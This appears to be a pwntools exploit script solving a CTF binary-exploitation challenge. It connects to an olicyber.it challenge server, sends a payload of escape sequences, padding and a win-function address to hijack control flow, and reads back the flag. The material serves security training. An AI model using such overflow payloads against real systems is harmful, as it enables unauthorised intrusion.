from pwn import *


win_addr = 0x0401255
c = remote("formatter.challs.olicyber.it", 20006)

ow_size = 0x50
c.recvuntil(b'stringhe.\n')
p_escp = min((ow_size // 4), 12)
print(len(b'A' * (ow_size - 4*p_escp)))
payload = b'\\a'*p_escp + b'A' * (ow_size - 4*p_escp) + p64(win_addr)
c.sendline(payload)
f = c.readall().splitlines()[-2].decode()
print(f)
